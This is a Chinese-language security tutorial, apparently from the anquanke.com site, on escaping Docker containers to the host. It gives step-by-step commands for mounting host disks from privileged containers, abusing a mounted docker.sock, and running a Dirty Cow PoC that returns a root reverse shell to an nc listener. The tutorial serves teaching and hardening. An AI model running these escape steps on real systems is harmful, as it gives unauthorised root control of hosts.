> 原文链接: https://www.anquanke.com//post/id/179623 


# Docker逃逸初探


                                阅读量   
                                **526568**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t01e43e4658ca676011.png)](https://p3.ssl.qhimg.com/t01e43e4658ca676011.png)



Docker是当今使用范围最广的开源容器技术之一，具有高效易用的优点。然而如果使用Docker时采取不当安全策略，则可能导致系统面临安全威胁。

本期安仔课堂，ISEC实验室的张老师将为大家介绍不同环境下，Docker逃逸至外部宿主机的情况。



## 一、配置特权模式时的逃逸情况

### <a name="%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94privileged%EF%BC%88%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%89"></a>（一）—privileged（特权模式）

特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。

使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。

当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。

具体步骤如下：

1.以特权模式运行一个容器：docker run -it —privileged ubuntu:14.04 /bin/bash

2.查看磁盘文件：fdisk -l

[![](https://p5.ssl.qhimg.com/t017d4a9fc96466e2de.png)](https://p5.ssl.qhimg.com/t017d4a9fc96466e2de.png)

图1

3.此时查看/dev/路径会发现很多设备文件：ls /dev

[![](https://p5.ssl.qhimg.com/t01c8eebbc4541365b6.png)](https://p5.ssl.qhimg.com/t01c8eebbc4541365b6.png)

图2

4.新建目录以备挂载：mkdir /abc

5.将/dev/sda1挂载至 /abc: mount /dev/sda1 /abc

6.最终我们可以通过访问容器内部的/abc路径来达到访问整个宿主机的目的：ls /abc

[![](https://p4.ssl.qhimg.com/t01e3e48c084f5b1d88.png)](https://p4.ssl.qhimg.com/t01e3e48c084f5b1d88.png)

图3

7.尝试写文件到宿主机：echo 123 &gt; /abc/home/botasky/escape2

[![](https://p1.ssl.qhimg.com/t01bc257ae79e6cf6b5.png)](https://p1.ssl.qhimg.com/t01bc257ae79e6cf6b5.png)

图4

8.查看宿主机中的文件：ls /home/botasky/escape2

[![](https://p1.ssl.qhimg.com/t01ff154cd62f935911.png)](https://p1.ssl.qhimg.com/t01ff154cd62f935911.png)

图5

### <a name="%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94cap-add%E4%B8%8ESYS_ADMIN"></a>（二）—cap-add与SYS_ADMIN

Linux内核自版本2.2起引入功能（capabilities）机制，打破了UNIX/LINUX操作系统中超级用户与普通用户的概念，允许普通用户执行超级用户权限方能运行的命令。

截至Linux 3.0版本，Linux中共有38种capabilities。Docker容器默认限制为14个capabilities，管理员可以使用—cap-add和—cap-drop选项为容器精确配置capabilities。

当容器使用特权模式启动时，将被赋予所有capabilities。此外，在—cap-add的诸多选项中，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，因此当容器以—cap-add=SYSADMIN启动时，也将面临威胁。



## 二、挂载配置不当时的逃逸情况

### <a name="%EF%BC%88%E4%B8%80%EF%BC%89%E5%8D%B1%E9%99%A9%E7%9A%84Docker.sock"></a>（一）危险的Docker.sock

众所周知，Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：

[![](https://p4.ssl.qhimg.com/t01540c3e5937facd5b.jpg)](https://p4.ssl.qhimg.com/t01540c3e5937facd5b.jpg)

图6

其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。

本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。

因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。

具体步骤如下：

1.运行一个挂载/var/run/的容器：docker run -it -v /var/run/:/host/var/run/ ubuntu:14.04 /bin/bash

2.在容器内安装Docker作为client(此步骤可能需要更换源)：apt-get install docker.io

3.查看宿主机Docker信息：docker -H unix:///host/var/run/docker.sock info

[![](https://p1.ssl.qhimg.com/t0138c69f1e8530c650.png)](https://p1.ssl.qhimg.com/t0138c69f1e8530c650.png)

图7

4.运行一个新容器并挂载宿主机根路径：docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash

可以看见@符号后的Docker ID已经发生变化：

[![](https://p5.ssl.qhimg.com/t01546eb1f4da42de67.png)](https://p5.ssl.qhimg.com/t01546eb1f4da42de67.png)

图8

5.在新容器/aa路径下完成对宿主机资源的访问：ls /aa

[![](https://p2.ssl.qhimg.com/t01e8cef2efdc4bc94a.png)](https://p2.ssl.qhimg.com/t01e8cef2efdc4bc94a.png)

图9



## 三、存在Dirty Cow漏洞时的逃逸情况

### <a name="%EF%BC%88%E4%B8%80%EF%BC%89%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E(CVE-2016-5195)%E4%B8%8EVDSO(%E8%99%9A%E6%8B%9F%E5%8A%A8%E6%80%81%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1)"></a>（一）脏牛漏洞(CVE-2016-5195)与VDSO(虚拟动态共享对象)

Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。

竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。

在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。

### <a name="%EF%BC%88%E4%BA%8C%EF%BC%89PoC&amp;%E9%AA%8C%E8%AF%81%E7%8E%AF%E5%A2%83"></a>（二）PoC&amp;验证环境

GitHub上已有人提供了测试环境与PoC，我们可以通过以下命令获取。

[![](https://p2.ssl.qhimg.com/t01c46820afd589e692.bmp)](https://p2.ssl.qhimg.com/t01c46820afd589e692.bmp)

图10
1. 运行验证容器：docker-compose run dirtycow /bin/bash<br>[![](https://p1.ssl.qhimg.com/t01678de892c44c7df9.png)](https://p1.ssl.qhimg.com/t01678de892c44c7df9.png)图11
1. 本地开启nc，进行观察（PoC中设置的反弹地址为本地的1234端口）：nc -lvp 1234
<li>编译PoC并运行，等待shell反弹：make &amp;./0xdeadbeef<br>
通过ID命令，可以发现这个shell为root权限：<br>[![](https://p4.ssl.qhimg.com/t0132508743289d09dd.png)](https://p4.ssl.qhimg.com/t0132508743289d09dd.png)<br>
图12</li>


## 参考&amp;引用

[![](https://p5.ssl.qhimg.com/t01d346ecdb83ddd32e.png)](https://p5.ssl.qhimg.com/t01d346ecdb83ddd32e.png)
